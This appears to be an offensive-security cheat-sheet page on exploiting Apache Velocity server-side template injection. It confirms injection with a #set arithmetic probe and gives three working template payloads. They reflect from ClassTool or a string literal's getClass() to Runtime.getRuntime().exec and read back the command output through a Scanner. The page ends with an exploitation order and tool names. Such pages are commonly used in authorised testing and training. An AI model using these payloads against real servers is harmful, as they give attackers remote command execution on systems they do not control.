---
title: "Velocity server-side template injection"
description: "Exploiting Apache Velocity SSTI: confirming with #set, and reflecting from a class reference through ClassTool to Runtime.getRuntime().exec for command execution."
keywords:
  - Velocity SSTI
  - VelocityTools
  - ClassTool inspect
  - Runtime exec reflection
---

# Velocity

Apache Velocity uses `#set` directives and `$`-references. Confirm injection with `#set($x = 7 * 7)$x` rendering `49` (and `${7*7}` where the context evaluates it). Velocity has no command-execution utility of its own, so RCE is built by reflecting from an object already in scope to `java.lang.Runtime`.

The standard chain obtains a `Class` object, walks to its classloader or directly to `Runtime`, and calls `exec`. When the VelocityTools `ClassTool` is available (exposed as `$class` or similar), it provides the reflection entry point:

```velocity
#set($e = "e")
#set($run = $class.inspect("java.lang.Runtime").type)
#set($i = $run.getRuntime().exec("id"))
$i
```

Without a tool reference, the chain starts from any object's `getClass()` and uses `forName` to load `Runtime`:

```velocity
#set($str = $stringLiteral.class.forName("java.lang.Runtime"))
#set($rt = $str.getMethod("getRuntime",null).invoke(null,null))
$rt.exec("id")
```

To read the command output (rather than a bare `Process` object), wire the process `InputStream` through a scanner:

```velocity
#set($proc = $rt.exec("id"))
#set($is = $proc.getInputStream())
#set($scan = $stringLiteral.class.forName("java.util.Scanner").getConstructor($stringLiteral.class.forName("java.io.InputStream")).newInstance($is).useDelimiter("\A"))
$scan.next()
```

Exploitability depends on what the context exposes. Stock Velocity with no tools and a restricted context can still reach `getClass()` on any string literal, which is enough to bootstrap the reflection chain; the practical blocker is a `SecurityManager` or a context that exposes no object references at all. Confirm with the `#set` math probe, then try the `ClassTool` form first and fall back to the pure-reflection chain.

## Tools

- tplmap, SSTImap

## References

- Apache Velocity and VelocityTools documentation
- PortSwigger Web Security Academy: Server-side template injection
